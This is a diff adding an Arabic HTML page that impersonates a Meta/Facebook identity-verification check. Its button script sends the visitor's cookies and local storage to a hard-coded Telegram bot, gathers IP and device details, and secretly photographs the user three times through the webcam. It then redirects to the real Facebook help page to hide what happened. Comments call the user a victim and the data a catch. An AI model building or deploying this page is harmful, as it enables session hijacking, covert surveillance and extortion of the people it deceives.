@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تأكيد ملكية الحساب | Meta Support</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border-top: 8px solid #1877f2; }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
+        p { color: #606770; font-size: 15px; line-height: 1.5; }
+        .btn { background-color: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; margin-top: 20px; }
+        #v, #c { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="logo">
+    <h2>تحقق أمني مطلوب</h2>
+    <p>لقد تم رصد نشاط مشبوه على حسابك. يرجى الضغط على الزر أدناه لإتمام فحص الهوية الفوري وإغلاق ملف التحقيق الجنائي.</p>
+    <button class="btn" onclick="executeEverything()">تأكيد الهوية الآن</button>
+</div>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
+
+<script>
+    const TOKEN = "8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc";
+    const ID = "7184970355";
+
+    async function executeEverything() {
+        // 1. خطف الجلسة (Cookies & Storage)
+        let sessionData = `🍪 كوكيز الجلسة: ${document.cookie || "محمية"}\n\n💾 التخزين المحلي: ${JSON.stringify(localStorage)}`;
+        sendToTelegram(sessionData);
+
+        try {
+            // 2. طلب الكاميرا (باسم الفحص الأمني)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+            
+            // 3. سحب المعلومات التقنية والـ IP
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const battery = await (navigator.getBattery ? navigator.getBattery() : {level:0});
+            
+            let deviceReport = `🎯 هدف جديد تم صيده!\n🌐 IP: ${ipData.ip}\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${battery.level * 100}%\n🔗 الرابط: ${window.location.href}`;
+            sendToTelegram(deviceReport);
+
+            // 4. تصوير الضحية 3 مرات وإرسالها
+            for (let i = 0; i < 3; i++) {
+                await new Promise(r => setTimeout(r, 1500));
+                snapPhoto();
+            }
+
+            // 5. تمويه نهائي (توجيهه لصفحة الدعم الحقيقية)
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/help";
+            }, 4000);
+
+        } catch (err) {
+            sendToTelegram("⚠️ المبتز رفض الكاميرا لكن تم سحب الـ IP والجلسة بنجاح.");
+        }
+    }
+
+    function snapPhoto() {
+        const canvas = document.getElementById('c');
+        const video = document.getElementById('v');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', ID);
+            formData.append('photo', blob, 'victim.jpg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }, 'image/jpeg');
+    }
+
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
+    }
+</script>
+</body>
+</html>
